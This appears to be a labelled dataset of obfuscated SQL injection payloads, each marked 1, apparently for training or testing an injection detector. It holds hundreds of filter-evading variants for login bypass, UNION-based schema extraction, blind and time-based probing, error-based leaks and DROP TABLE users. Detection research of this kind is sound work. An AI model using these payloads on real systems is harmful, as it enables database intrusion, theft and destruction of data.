"'/**/AND/**/extractvalue(1,concat(0x5c,version()))--", 1
"1' Or ASCiI(SUbStRiNg(DaTaBASe(), 1, 1)) > 100 --", 1
"' OR '1'='1 AND 'a'='a'", 1
"'%09%09%09%09%09OR%09%09%09%09%09'1' = '1", 1
"admin'/*!12345*/OR '1'='1", 1
"admin'O/*!12345*/R/*%0d%0a*/'1'='1", 1
"", 1
"' AnD 1=1 --", 1
"'/**/A/**/ND/**/1=convert(int,@@version)--", 1
"'%0d%0aOR1	>=1--", 1
"%27%2520O%2552%20EXISTS%28SEL%2545CT%201%2520FROM%20user%2573%29----jdyneere4n43", 1
"test%27%20O/*!*/R%20%271%27%3D%271%27%20--%20", 1
"'UNIONSELECTnull,", 1
"null,null/*%0d%0a*/ OR (1)--#prdj2xbsvhsngp", 1
"TEst' xoR '1'='1' /*", 1
"1%29%29%20UNION%20SELECT%201%2Cdatabase%28%29%2C3--#anqao02uijb", 1
"%27%20AND%201%3Dconvert%28int%2C%40%40version%29----el9o01j0g8i9", 1
"'%09%09%09AND%09%09%09extractvalue(1,concat(0x5c,version()))%09%09%09--%09%09%09random_noise--", 1
"1%27%20AND%20substring(database(),%201,%201)%20%3D%20%27s%27%20--#7xy64v8w", 1
"'%20%20%20%20AND%20%20%20%201	=%09convert(int,@@version)--", 1
"%27%20AND%201%3Dconvert%28int%2C%40%40version%29%20%23%20more_noise----r70qzvl8qfrprh", 1
"admin%25u0027%25u0020OR%25u0020%25u00271%25u0027%253D%25u00271", 1
";/*!12345*/DROPTABLE", 1
"users; -- random_noise--", 1
"1)%09%09%09UNION%09%09%09SELECT%09%09%091,database(),3--", 1
"1' OR ascii(substring(database(), 1, 1)) > 100 ----0lc87lzsd5", 1
"1 AND 1=1#nsbaudlmtku", 1
"; SELECT pg_sleep(5); ----n6rofspjc4tfuxa", 1
"1/**/&& (1=1)1=1", 1
"'/*!*/&& (1=1)1>=1 --", 1
"%u0027%u0020UN/*!12345*/ION%u0020SELECT%u00201,2,3--#t181d91o", 1
";        DROP        T%41BLE        u%73e%72s;        ----e8tkx", 1
"'XoR1>=1%0a--/*%0D%0A*/", 1
"' UNioN selEct null, nUlL, nULl --", 1
"' UNION SELECT null, null, null -- #vwddefchcrx", 1
"'O/**/R/*%0A*/'1'LIKE'1/*%0A*/", 1
"1'/**/UNION/**/SELECT/**/table_name,/**/null,/**/null/**/FROM/**/information_schema.tables/**/--", 1
"'/**/O/*!*/R/**/'1'>='1", 1
"1%27%20AND%20substring%28database%28%29%2C%201%2C%201%29%20%3D%20%27s%27%20%u0020#%u0020more_noise--", 1
"%2527%2520OR%2520%25271%2527%25%2533D%252%25371", 1
"' xOR 1LikEcoNvERt(iNt,@@verSIoN)----SnKU62QCnlBdGy", 1
";/*!*/SEleCt PG_SlEEp(5); --", 1
"1'/*!*/   UNION    SELECT    table_name,    null,    null    FROM    information_schema.tables    --#nrwb85ogogfr", 1
"'/**/A%4eD/**/extractvalue(1,co%6e%63at(0x%35c,version()))%2d-", 1
"'    AND    1  =%09convert(int,@@version)--", 1
"1'				OR				ascii(substring(database(),				1,				1))				>				100				--", 1
"1))/**/UNION/**/SELECT/**/1,database(),3 -- random_noise----eio6q", 1
"test'/**/OR/**/'1' = '1'/**//*", 1
"admin' XOR '1'='1", 1
"; SELECT p%67_s%6cee%70(5); --", 1
"1/*!12345*/AND/**/1%3D1", 1
"1'/**/AnD SuBsTriNG(DataBAsE(), 1, 1) = 's' --", 1
"%u0027%u0020UNION%u0020SELECT%u00201,2,3--#2jbo66", 1
"test'%20%20%20%20%20OR%20%20%20%20%20'1'%09=%09'1'%20%20%20%20%20--%20%20%20%20%20", 1
"'/*!*/UNION  SELECT  1,2,3--", 1
"%u0027/*!*/AND%u00201=1%u0020--%u0020", 1
"1)%20%20%20%20uniOn%20%20%20%20SelEct%20%20%20%201,DataBaSe(),3--", 1
"ADMIN'Or/*%0d%0a*/'1'='1/*%0d%0a*/", 1
"1'orIF(SuBStrING(dAtaBASE(),%0d%0a1,1)>='A',/*%0d%0a*/sLEeP(5),0)--/*%0d%0a*/", 1
"tes%74%u0027%u0020%4fR%u0020%%7500271%u0027>=%u0%30271%u0027%u002%30/%2a", 1
"test' OR '1'='1' /* /*!*/AND 1=1", 1
"1' OR ascii(substring(database(), 1, 1)) > 100 --#igka8lmrgf8b", 1
"ADMin'/*!*/oR/**/'1'<='1", 1
"1%27%20OR%20IF(su%62%73trin%67(database(),%201,%201)%3D%27a%27%2c%20SLEEP(5),%200)%20-%2d", 1
"1'/**/OR/**/IF(substring(database(),/**/1,/**/1)='a',/**/SLEEP(5),/**/0)/**/----qjw2o5c2nokvt", 1
"%27%20UNION%20SELECT%20null%2C%20null%2C%20null%20--%20%23r53ja", 1
"'/*!12345*/OREXISTS(SELECT1/*%0a*/FROMusers)--#4r0kdjmb%0d%0a", 1
"%27/**/oR/**%2f%271%27%3D%271", 1
"1'/**/OR IF(substring(database(), 1, 1)='a', SLEEP(5), 0) --#97fo6l20et6", 1
"%27%2F%2A%2112345%2A%2FUNION%20SELECT%201%2C2%2C3--", 1
"test'  OR  '1'%09=	'1'  --", 1
"%27%20UN/**/ION%20SELECT%201,2,3----5hqnyyatpvir2x", 1
"%2527OREXISTS%28SELECT%2F%2A%250d%250a%2A%2F1FROMusers%29--%236kk40m0%2F%2A%250d%250a%2A%2F", 1
"1)/**/UnION/**/sELEct/**/1,DatABASe(),3--", 1
"'/**/AND/**/1  =  convert(int,@@version)				OR				(1)--", 1
"' OR 1=1 -- #6yi8xi81d4o562o", 1
"1%29%29%20UNIOn%20SELEcT%201%2CDAtaBAsE%28%29%2C3--%23rFW8VOwh5bq", 1
"test%27%20XOR%20%271%27%3D%271%27%20--%20", 1
"%27%20UNION%20SELECT%201%2C2%2C3 OR (1)--", 1
"1))UN/*!12345*/ION%%30d%0%61SEL%45CT1,da%74aba%73e(),3----e9tes", 1
"1'&&(1=1)substring(database(),1,1)LIKE's'%0a--random_noise--", 1
"%2527%2520UNION%2520SELECT%2520null%2C%2520null%2C%2520null%2520%20%23%20more_noise--%2520", 1
"admin%27/**/||/**/%271%27='1", 1
"1%29%29%20%20%20%20%20%20%20%20UNION%20%20%20%20%20%20%20%20SELECT%20%20%20%20%20%20%20%201%2Cdatabase%28%29%2C3--", 1
"' oR eXiSTS(Sel%45C%54 1 fR%6fm UsERs%29--", 1
";/**/SELECT pg_sleep(5); --", 1
"1%u0020AND%u0020%31>=%31 OR 'b'='b'", 1
"' oR '1'IN (1)'1", 1
"'AN%44/*%0a*/1=con%76%65rt(int,@@versio%6e)--", 1
"'/**/OR/**/'1'>='1/**//*!*/AND/**/1=1", 1
"'AND%0a1=convert(int,@@version)--/*%0a*/", 1
"%27%20Or%20%45xIsts(SeLeCt%201%20fRom%20%75se%72S)-%2d--Y6O1H4dq", 1
"' oR 1=1 --", 1
"TEST%27%20or%20%271%27%3D%271%27%20--%20--10bj2sq", 1
"1))%20%20%20%20%20Un/*!*/ioN%20%20%20%20%20SeLEct%20%20%20%20%201,DAtaBAse(),3--", 1
"%u0027%u0020UNION%u0020SELECT%u00201,2,3--#qtxryv", 1
"test' OR '1'='1' -- #p9iknnfjg6", 1
";%U0020DRoP%U0020TabLe%u0020userS;%U0020----WYdy8w2S1zso", 1
"'AND/*%0d%0a*/1	=%09convert(int,@@version)--", 1
"", 1
"1%29%29%20UNION%20SELECT%201%2Cdatabase%28%29%2C3----rknm6c91z9", 1
"%u0027%u0020AND%u0020extractvalue(1,concat(0x5c,version()))--#d2b1zb94cc22", 1
"1%u0027/**/AND/**/substring(database(),/**/1,/**/1)/**/%3C%3D/**/%u0027s%u0027/**/--", 1
"%27%20A/**/ND%%320%65xtractvalue%281%2%43co%6ecat%280x5c%2Cv%65rsion%2%38%29%29%29%2d-", 1
"%u0027%u0020AND%u00201=1%u0020%u0020/*!*/AND%u00201=1--%u0020", 1
"%u0027%u0020%u0020OR%u0020%u0020EXI%53T%53%28SELECT%u0020%u00201%u0020%u0020FROM%u0020%u0020use%72s)--", 1
"WAItFOR D%65lay '%30:0:5'-%2d", 1
"%27%20%20%20%20OR%20%20%20%20%271%27%20%20%3D%09%271", 1
"%u0027%u0020%u0020AND%u0020%u00201%u0020%u0020=%u0020%u0020%63onv%65rt(%69nt,@@versio%6e)--", 1
"%3B%2F%2A%2112345%2A%2FSELECT%25u0020pg_sleep%285%29%3B%25u0020--", 1
"1' UNION SELECT table_name, null, null FROM information_schema.tables  /*!*/AND 1=1--#27lcsi", 1
"%25u0027%25u0020AND%25u00201%3D1%25u0020 OR 'b'='b'--%25u0020#lhllkrd3ydj", 1
"test'%20%20OR%20%20'1'/*!12345*/ =%20'1'%20%20/*--hoqmg7w83wgsg9", 1
"WAITFOR%2520%2520%2520%2520DELAY%2520%2520%2520%2520%270%3A0%3A5%27--", 1
"1%u0027/*!12345*/UnIoN%u0020SElecT%u0020TaBle_nAMe,%u0020NULL,%u0020NuLl%u0020FrOM%u0020INFORmaTIon_SCHEMa.tABles%u0020--", 1
"AdMiN%27/**/oR/**/%271%27%3D%271", 1
"'/**/And 1=cONvErt(iNt,@@VersiON)--", 1
"'/**/AND/**/1>=1/**/--/**/#23gmj", 1
"%27 %41ND ex%74r%61ctvalue(1%2cconcat(0x5c,version()))--", 1
";%20sELEct%20pg_slEEP(5);%20--#mzf8j8lro", 1
"1)%u0020UNION%20SEL%45CT%u00201,d%61tabase%28),3--", 1
"'UNIONSELECT/*%0a*/1,2,3||%0a(1=1)(1)--/*%0d%0a*/--ch6n3xc", 1
"1%27 unION sElect tA%62l%65_NAm%65, nuLl, %6eul%6C fROM INformATion%5fsCHemA.Tab%6Ces --", 1
"test%27OR%0d%0%61'1%27='1'", 1
"/*/*%0a*/", 1
"'/**/anD/**/eXtRaCtvaLUe(1,cOncAt(0x5c,VeRsIon())) OR 'b'='b'--#81p87qlqwne", 1
"1%25u0027%25u0020OR%25u0020ascii%28substring%28database%28%29%2C%25u00201%2C%25u00201%29%29%25u0020%3E%25u0020100%25u0020--", 1
"%u0027%u0020OR%u00201 =%201%u0020 # more_noise--%u0020", 1
"%27%20OR%20%271%27IN%20%281%29%271%20%2F%2A%21%2A%2FAND%201%3D1", 1
"1)/**/uniON/**/sElEcT/**/1,databASE(),3----l7r0QnsAR", 1
"'/**/UN/**/ION/**%2fSELECT/*%2a%2f%31,2,3--", 1
"1' AND substr%69%6eg(dat%61base(), 1, 1)%20%3d 's' --#vajuezzemz73sb", 1
"1%27/*!*/AND%20substring(database(),%201,%201)%20%3D%20%27s%27%20--", 1
"'OR/*%0a*/'1'='1/*%0a*/", 1
"%74Est'/*%2A/Or/**/'1'='1'/**/-%2D%2F**/", 1
"' OR 1LIKE1 --", 1
"1/*!*/XOR 1<=1 AND 'a'='a'", 1
"1%27%09%09%09%09%09AND%09%09%09%09%09substring%28database%28%29%2C%09%09%09%09%091%2C%09%09%09%09%091%29%09%09%09%09%09%09%3D%20%09%09%09%09%09%27s%27%09%09%09%09%09--", 1
"WAITFORDELAY/*%0d%0a*/'0:0:5'--/*%0a*/", 1
"test'/*!*/OR'1'IN%0d%0a(1)'1'--", 1
"'%20%20%20%20AND%20%20%20%201%09=%09convert(int,@@version)--", 1
"'/*!12345*/uNIoN/**/SelEct/**/1,2,3----nawtd1z", 1
"admin'/**/OR '1'LIKE'1", 1
"'/**/ANd/**/1=1/**/ # more_noise--/**/", 1
"%27%20aNd%201%3C%3DconVErt(InT,@@VeRsION)--#um420bo7v0zn", 1
"test'		OR		'1'LIKE'1'		/*		--		random_noise", 1
"' OR E%58ISTS(%53ELECT 1 FROM %75se%72s)--", 1
"1)) U%4eIO%4e SELECT 1,database()%2c%33 OR (1)--", 1
"%27%20UNION%20SELECT%201,2,3/**/AND/**/'a'='a'----e7iyijmw", 1
"admin%u0027%u0020||%u0020%u00271%u0027=%u00271", 1
"'/*!*/OR 1=1 -- #y32qbujz", 1
"%27%20UNION%20SELECT%20null%2C%20null%2C%20null%20 AND 'a'='a'--%20--a8k0z7", 1
"1%25u0027%2F%2A%21%2A%2FOR%25u0020IF%28substring%28database%28%29%2C%25u00201%2C%25u00201%29%3D%25u0027a%25u0027%2C%25u0020SLEEP%285%29%2C%25u00200%29%25u0020%20OR%20%281%29--", 1
"ADMin'Or%0d%0a'1'%20=	'1OR/*%0d%0a*/(1)%0a", 1
"; SELECT pg_sleep(5); ----5g3xr0na28ljfe", 1
"%27%20AND%201%3D1%20--%20--1xfga0f", 1
";/**/DROp/**/tAblE/**/Users;/**/--", 1
"%27/*%0d%0a*/UNION", 1
"", 1
"SELECT1,2,3--", 1
"1/**/ANd 1=1--uuRKsdeJKt3", 1
"'O/*!12345*/R1<=1--/*%0d%0a*/", 1
"1'/**//**/AND/**//**/substring(database(),/**//**/1,/**//**/1)/**//**/IN/**//**/(1)/**//**/'s'/**//**//**/OR/**/'b'='b'--", 1
"%25u0027%25u0020OR%25u0020EXISTS%28SELECT%25u00201%25u0020FROM%25u0020users%29 # more_noise--", 1
"1%27%20OR%20ascii%28substring%28database%28%29%2C%201%2C%201%29%29%20%3E%20100%20%20OR%20%281%29--", 1
"%25u0027%25u0020AND%25u00201%3Dconvert%28int%2C%40%40version%29--", 1
"' AND 1%3d1%20--", 1
"%25u0027%25u0020AND%25u00201%3Dconvert%28int%2C%40%40version%29----9k068j38ha", 1
"%u0027UNION/*%0a*/SELECT/*%0d%0a*/1,2,3--%0d%0a", 1
";     DROP     TABLE     users;     --", 1
"1%2%39%20U%4eION%20SELE%43T%201%2Cdatabase%%32%38%29%2C3--", 1
"tesT'					or					'1'  =%20'1'					/* AND 'a'='a'", 1
"1'/*!*/UNION SELECT table_name, null, null FROM information_schema.tables --#o6ryfeuhq700lg", 1
"AdmIn%u0027%u0020OR%u0020%u00271%u0027=%u00271", 1
"tEST%27%%320or%20%271%%327%3D%271%2%37%2%30--%20", 1
"1%27%20AND substring(database(), %31, 1) %49N%20(1) 's' --", 1
"1)/**/UNION SELECT 1,database(),3--#pdtopzr0c4", 1
"'					UNION					SELECT					1,2,3--#s99htk", 1
"'    UNION    SELECT    1,2,3--#n0lsgzk3x", 1
"' OR '1'%3d%271 AND 'a'='a'", 1
"test'/*!12345*/OR '1' = '1' --", 1
"1'O/*!*/riF(subSTRInG(DATABase(),1,", 1
"1)<='a',%0aSlEEp(5),/*%0D%0A*/0)--", 1
"'/**/AND/*%2a/%65xtractv%61lue(1,concat(0x5c,v%65%72sio%6e()))--", 1
"'/**/OR/**/1=1/**/ # more_noise--/**/", 1
"ADmIn'or%0d%0a'1'%20=%20'1", 1
"1%u0020AND%u00201=1 # more_noise", 1
"%3B%20SELECT%20pg_sleep%285%29%3B%20--#3jryj", 1
"%3B%20sELEcT%20Pg_SlEep%285%29%3B%20--", 1
";/**/DrOP/**/TAbLE/**/USERS;/**/--", 1
"test%27%20OR%%320%%3271%2%37%3D%271%27%20%2F%%32A%23e5y3ogqh64%32tdr", 1
"test%u0%3027%u0020OR%u0020%u00%32%371%u0027%3d%u00271%%750027%u%30020/*", 1
"' || 1%3d1 %2d-", 1
"1%27%20OR%20ascii%28substring%28database%28%29%2C%201%2C%201%29%29%20%3E%20100%20----ean8n6vy1", 1
"' UNIOn sELEcT Null, NUlL, NuLL --", 1
"1'/**/AND/**/substring(database(),/**/1,/**/1)/**/LIKE/**/'s'/**/--", 1
"WaiTfOr/**/dELAy/**/'0:0:5'----2MJ65C9yTv3", 1
";%20DroP%20tabLe%20UseRS;%20%u0020aND%U0020%U0027a%u0027=%u0027A%u0027--", 1
"' OR E%58ISTS(SELECT %31 %46ROM us%65rs)--", 1
"1'/**/AND/**/substring(%64ataba%73e(),%2f**/1%2c/**/1)%2f**/%3d/*%2a/'s'/**/ OR%20'b'='b'--", 1
"1))UNION%0d%0aSELECT1,database(),3--%0d%0a", 1
"1and/*%0a*/1LiKE1%0d%0a--tcqh3aj8yh", 1
"1' or if(SUBsTRiNG(databASE(), 1, 1)='a', sleEp(5), 0) --", 1
"' o%52 eXISTs(seLE%43t 1 fROm %75%73ERs)----EWc%79ve", 1
"1'%20OR%20IF(substring(database(),%201,%201)/**//**/=%20'a',%20SLEEP(5),%200)%20%20OR%20(1)--", 1
"%u0027%u0020OR%u0020EXIS%54S(SE%4cEC%54%u00201%20FROM%u0020users)----u8240yl39hbrgn", 1
"1%25u0027%25u0020%25u0020%25u0020%25u0020%25u0020%25u0020%25u0020%25u0020%25u0020%25u0020OR%25u0020%25u0020%25u0020%25u0020%25u0020%25u0020%25u0020%25u0020%25u0020%25u0020IF%28substring%28database%28%29%2C%25u0020%25u0020%25u0020%25u0020%25u0020%25u0020%25u0020%25u0020%25u0020%25u00201%2C%25u0020%25u0020%25u0020%25u0020%25u0020%25u0020%25u0020%25u0020%25u0020%25u00201%29%25u0020%3D%09%25u0027a%25u0027%2C%25u0020%25u0020%25u0020%25u0020%25u0020%25u0020%25u0020%25u0020%25u0020%25u0020SLEEP%285%29%2C%25u0020%25u0020%25u0020%25u0020%25u0020%25u0020%25u0020%25u0020%25u0020%25u00200%29%25u0020%25u0020%25u0020%25u0020%25u0020%25u0020%25u0020%25u0020%25u0020%25u0020%20%2F%2A%21%2A%2FAND%201%3D1--", 1
"' AND 1=1 -- --exoamq6asa2", 1
"W%41%49TFOR			DE%4cAY			'0:0:5'--", 1
";%20SELect%20pg_sLeEp(5);%20 AnD 'a'='A'--#dxyGZIaiysYpt7", 1
";DROP/*%0a*/TABLEusers;/*%0a*/--", 1
"'/**/AND/**/1=convert(int,@@version)/**/--/**/random_noise--", 1
"' AN%44 1=convert(int,%40@v%65rsion%29--", 1
"test%27%20OR%20%271%27%3D%271%27%20%2F%2A%20OR%20(1)", 1
"1))%09%09%09%09%09unIoN%20SE%4c%45cT%09%09%09%09%091,databASE(%29,3%09%09%09%09%09or%09%09%09%09%09(1%29--", 1
"; DRO%50 TABLE users;  %41%4eD 'a'=%27a'--", 1
"1 %41%4eD 1LIke1", 1
"WAI%54FOR/**/DELA%59/*%2a/'0:0:5'--", 1
"%27/**/A/*!12345*/nd/**/eXtRAcTVAluE(1,cONCAt(0x5C,vERsIon()))--", 1
"1' OR ascii(substring(database(), 1, 1)) > 100 --#0cba1l2b2h8a0", 1
"1%27ORasci%2569%28su%2562stri%256eg%28da%2574a%2562ase%28%29%2C%0A1%2C1%29%29%3E100--", 1
"1%u0027%u0020AND%u0020substring(database(),%u00201,%u00201)%u0020=%u0020%u0027s%u0027%u0020%u0020/*!*/AND%u00201=1----jcnxmf", 1
"'/**/OR EXISTS(SELECT 1 FROM users)--", 1
";/*!12345*/DROP TABLE users; --", 1
"1)%20UNIO%4e%u0020SELE%43T%u00201,database()%2c3----0hsbir7hg", 1
"1%27%20UniOn%20SElecT%20tABLe_naME%2C%20NuLl%2c%20nulL%20froM%20InFOrMAtiON_scHema.TabLEs%20--", 1
"%27%20OR%20%271%27%3D%271%23zr8lm6qnwxfiizo", 1
"admin%27O%2F%2A%2112345%2A%2FR%250d%250a%271%27%3D%271", 1
"1%29%29UNI%254fN%250%2564%250aSELECT%2531%2Cd%2561tabase%28%29%2C3--%252f%2A%250a%2A%2F", 1
"'OR1=1--/*%0d%0a*/", 1
"1'%20OR ascii(subst%72ing(d%61tab%61se()%2c 1, 1)) > 100 --", 1
"%u0027%u0020OR%u0020EXISTS(SEL/*!*/ECT%u00201%u0020FROM%u0020users)--", 1
"' Or '1'='1--88888847S3", 1
"%27%2F%2A%2A%2FAND%2F%2A%2A%2F1%3Dconvert%28int%2C%40%40version%29%20OR%20%281%29--", 1
"'/**/uNION/**/SeLEct/**/null,/**/NuLl,/**/Null/**/--/**/", 1
"%27%09%09anD%09%09eXTRActVAlUe%281%2CcOnCAT%280x5C%2CVERsiON%28%29%29%29--", 1
"%u0027%u0020AND%u00201=convert(int,@@version)--", 1
"'%20OR%20'1'%20LIKE'1/*%0d%0a*/", 1
"%27%20%20%20%20%20%20AND%20%20%20%20%20%201%20%20%3D%2509convert%28int%2C%40%40version%29 /*!*/AND 1=1--", 1
"%u0027OR/*%0a*/%u00271%u0027=%u00271", 1
"", 1
"1%u0027%u0020%55%4eION%u0020SELECT%u0020table_name,%u0020null,%u0020%6eu%6cl%u0020FROM%u0020in%66%6frmation_schema.tabl%65s%u0020-%2d%u0020OR%u0020%u0027b%u0027=%u0027b%u0027", 1
"admin%u0027%20%20%20%4fR%20%20%20%271%u0027%%309=/%2a*/%u00271", 1
"' aN%44 1=%31 --", 1
"1)) uNiON sELeCT 1,DaTABASE(),3--", 1
"1))/**/%55NIo%4E/**/%53ELEct/**/1,%64AtaBaSE(),3--", 1
"admin%27%20OR%20%271%27%3D%271--0lqdp", 1
"'/**/OR/**/EXISTS(SELECT/**/1/**/FROM/**/users) OR 'b'='b'--", 1
"'     AND     1IN     (1)1     --", 1
"1))/*!12345*/U%4eION SELECT 1,da%74%61base(%29,3-%2d", 1
"test%u0027%u0020OR%u0020%u00271%u0027<=%u00271%u0027%u0020--%u0020", 1
"1%u0027%u0020UNION%u0020SELECT%u0020table_name,%u0020null,%u0020null%u0020FROM%u0020information_schema.tables%u0020--#lxgmyl4uj2scz", 1
"1)/**/UNiOn%u0020sELEcT%u00201,DAtabase(),3--", 1
"%2527%2520UN/**/ION%2520SELECT%2520null%2C%2520null%2C%2520null%2520 /*!*/AND 1=1--%2520", 1
"'%20%20%20UNION%20%20%20SELECT%20%20%20null,%20%20%20null,%20%20%20null%20%20%20--%20%20%20", 1
"1%27%20or%20asCII%28subsTRINg%28dATaBASe%28%29%2C%201%2C%201%29%29%20%3E%20100%20--", 1
"test' XOR '1'='1' /* && 'a'='a'", 1
"; SELECT pg_sleep(5); --#nhbgvc6", 1
"1%27UNION%0ASELECT%2F%2A%250d%250a%2A%2Ftable_name%2Cnull%2CnullFROMinformation_schema.tables--", 1
"%27%20O%52%201%3D1%20--%20", 1
"test'/**/OR/**/'1'<='1'/**//*/**/OR/**/'b'='b'--lhekhxpmcxm2r", 1
"%27%20OR%20EXISTS(SELECT%201%20FROM%20users) # more_noise--", 1
"1' XOR IF(substring(da%74aba%73%65%28), 1, 1%29='a', SLEEP(5),%200) --", 1
"1anD/*%0D%0A*/1=1/*%0d%0a*/", 1
"WAITFOR%09%09DELAY%09%09'0:0:5'--", 1
"'UNION", 1
"SELECT1,2,3--", 1
";SELECTpg_sleep(5);--%0d%0a", 1
"' UNI%4fN S%45LECT%201,2,3--", 1
"1%2527%2520AND%2520substring%28database%28%29%2C%25201%2C%25201%29%2520%253D%2520%2527s%2527%2520--", 1
"1%27/*!*/OR%20ascii(substring(database(),%201,%201))%20%3E%20100%20----volq2r3n", 1
"1AND1=1/*%0d%0a*/", 1
"%27%20OR%20EXISTS(SEL/*!12345*/ECT%201%20FROM%20users)--", 1
"1%27%09aNd%09SubstriNG%28dATABase%28%29%2C%091%2C%091%29%09%20%3D%09%09%27s%27%09--", 1
"%u0027%u0020anD%u0020EXtRActvALue(1,ConcaT(0x5c,veRSIOn()))--", 1
"tesT%27 oR '1'='1' -%2d%20", 1
"%u0027%u0020OR%u0020%u00271%u0027=%u00271 OR 'b'='b'", 1
"%u0027%u0020UNION%u0020SELECT%u00201,2,3 XOR 'b'='b'--", 1
"1'/*!12345*/OR ascii(substr%69ng%28databas%65(), 1, 1)) %3e 1%300 --", 1
"'AND/*%0d%0a*/extractvalue(1,concat(0x5c,version()))--", 1
"", 1
";SELECT", 1
"pg_sleep(5);/*%0a*/--%0d%0a", 1
"test%27 OR%20'1'=%271' --", 1
"test%27%20%7C%7C%20%271%27%3D%271%27%20%2F%2A--hdcw86x4jf", 1
"WAITFOR/*!12345*/DELAY%20%270:0:5%27--", 1
"1%%327%09%09%09UN/*!12%3345*/IO%4e%09%09%0%39SEL%45CT%09%09%09ta%62le_na%6de%2C%09%09%09null%%32C%0%39%09%09null%09%09%09FRO%4d%09%09%09informa%74ion_sch%65ma.tab%6ces%09%09%09--", 1
"'UNI%4fN%20SEL/**/ECTnull,%0anu%6cl,nul%6c--", 1
"", 1
"'/**/AN%44 1%3d1 -- --x7uvupmd8njk3mv", 1
";/*!12345*/DR%4fP TABL%45 users%3b %2d-", 1
";%U0020drOP%u0020taBlE%U0020usErs;%u0020--", 1
"1'    OR    ascii(substring(database(),    1,    1))    >    100    --", 1
"'	UNION	SELECT	1,2,3--", 1
"1)%u%30020%u0020%u002%30%%750020%u00%320UNION%u%30020%u00%320%u0020%u0020%u0020SELECT%%750020%u0020%u%3002%30%u00%320%u0%30201,database(),3--", 1
"admin%27%2F%2A%211234%2535%2A%2F%254fR%20%271%27%3D%27%2531", 1
"1%27%20OR%20IF%28substring%28database%28%29%2C%201%2C%201%29%3D%27a%27%2C%20SLEEP%285%29%2C%200%29%20----grpjmo1iue", 1
"%2531%27%20UNIO%254e%2520SE%254cEC%2554%20table_name%2C%20null%2C%20null%20FROM%20in%2566ormation_schema.%2574ables%20%252d-", 1
"' AND 1IN (1)convert(int,@@version)--", 1
"1%u0027%u0020anD%u0020suBstRiNg(dATABaSe(),%u00201,%u00201)%u0020=%u0020%u0027s%u0027%u0020--", 1
"%u0027/**/AND/**/1=1/**/--/**/", 1
"' UNION SELECT 1,2,3 -- random_noise--", 1
"' AND 1=1  /*!*/AND 1=1-- #9v4flz", 1
"1'or%0d%0aIF(SubstriNg(dATAbase(),1,1)='a',sLeep(5),0)--/*%0d%0A*/", 1
"1'/**/OriF(subSTRInG(dATABAsE(),", 1
"1,/*%0A*/1)='A',slEeP(5),/*%0A*/0)--", 1
"%3B%20SELECT%20pg_sleep%285%29%3B%20/*!12345*/# more_noise--", 1
"1))%55NION%0aSE%4cEC%541,database%28),3--/*%0a*/", 1
"admin%u0027%u0020||%u0020%u00271%u0027%3D%u00271", 1
"'/**/UNION/**/SELECT/**/1,2,3----d727iji5t", 1
"1' or asCIi(S%75BstRIng(DA%74AbaSe(%29, 1, 1)) > 1%300 %2D-#0%30Ka0yb", 1
"TEst' Or '1'='1' --", 1
"1'/*!12345*/And SubSTrInG(dATAbAsE(), 1, 1) = 's' --", 1
"1' && (1<=%31)substring(data%62ase(%29, 1, 1%29 = '%73'  /*!*/AND 1=1--", 1
"'/**/OR/**/1	=  1/**/--/**/", 1
"1) UNION SELECT 1,database(),3--#49of8tdj", 1
"TeST' oR '1'='1' /*#4DKilNx9E", 1
"1%27ANDsubstring%28database%28%29%2C%0A1%2C%0A1%29%3D%27s%27--%250d%250a", 1
"te%73t%27|%7c'1'='1'/*%0d%0a*/%2d---qwl5xurr", 1
"1'%09%09%09%09OR%09%09%09%09IF(substring(database(),%09%09%09%091,%09%09%09%091)%20= 'a',%09%09%09%09SLEEP(5),%09%09%09%090)%09%09%09%09----z799n0pbgd0k1ds", 1
"1%u0027%u0020UNION%u0020SelECt%u0020tABle_NamE,%u0020null,%u0020NuLl%u0020fRoM%u0020INfORmAtIon_SchEMA.taBLES%u0020--", 1
"test%27%09%09OR%09%09%271%27%20%20%3D%09%271%27%09%09--%09%09", 1
"%74%65st'/*!*/OR '1%27='1' /*", 1
"%25u0027%25u0020OR%25u0020EXISTS%28SEL%2F%2A%2112345%2A%2FECT%25u00201%25u0020FROM%25u0020users%29----m2efqutxcbmd9", 1
"1%27%20OR%20IF(substring(database(),%201,%201)%3D%27a%27,%20SLEEP(5),%200)%20--#hrjrvpuxdw", 1
"admin' OR '1'='1--azo73", 1
"test'OR%0a'1'  =%20'1'", 1
"/*%0a # more_noise#vpib7yviq5r6w", 1
"' AND 1LIKE1 --", 1
"' OR 1>=1 -- --85zpjwe", 1
"test'or%0D%0a'1'%09=%20'1'/*%0A*//*/*%0A*/", 1
"%u0027%u0020aN%64%%750020ExTRaCTvaLue(1,ConCAT(0%785C,VER%73iO%6e())%29--", 1
";S%45LECT%2f*%0d%0a*%2fpg_sle%65p(5);", 1
"%2d- r%61ndom_noise--/*%0a*/", 1
"test'XOR'1'='1'/*%0d%0a*/--", 1
"1))%20U%6eIon%20s%65lect%20%31,%64ATABasE(),3----y3twnr1hf", 1
"%27%20XOR%20%271%27%3D%271", 1
"'      OR      1<%20=%091            #      more_noise--      #a3zrfi", 1
"1)%u0020uNioN%u0020seLecT%U00201,dATaBAse(),3--", 1
"'/**//**//**/A/*!*/ND/**//**//**/extractvalue(1,concat(0x5c,version()))--", 1
"1%27%20Or%20iF%28SUBsTRiNG%28DAtABAse%28%29%2C%201%2C%201%29%3d%27a%27%2c%20slEeP%285%29%2c%200%29%20--", 1
";/**/DRO%50/**%2fTABLE/**/users;/%2a*%2f--#d28r56f0l0u", 1
"%27 anD exTrACTVaLUe(1,ConCat(%30X5c,%76ErS%69oN%28)))--", 1
"tESt' oR '1'='1' /* /*!*/aND 1=1", 1
"1'%20OR if(SUbStriN%67(%64atabASE(), 1, 1%29='A', %73LEEP(5), 0)  %41nD 'A'='a'-%2d", 1
"%27%20aND%201%3DCONvERT(INT,@@versIon)--", 1
"' UNION SE%4cECT 1%2c2,3 -- rando%6d_noise%2d-#dsd5i6tif", 1
"%u0027%u0020ANd%u0020ExTRaCTVALue(1,ConcAT(0X5C,VErsIoN()))--", 1
"1%27%20OR%20ascii(substring(database(),%201,%201))%20%3E%20100%20----8v4zgdc58", 1
"test%27%20OR%20%271%27%3D%271%27%20%2F%2A--9xk94", 1
"%27%20%20UNION%20%20SELECT%20%20null,%20%20null,%20%20null%20%20--%20%20", 1
"'/*!*/OR 1=1 --", 1
"%31) %55NION SE%4cECT 1,database(),3%2d- -- random_noise", 1
"1%u0027%u0020OR%u0020ascii(substring(database(),%u00201,%u00201))%u0020>%u0020100%u0020 # more_noise----9l5e9asw", 1
"wAitfoR/**/%44%45LAy/**/'0:0:5'-%2D", 1
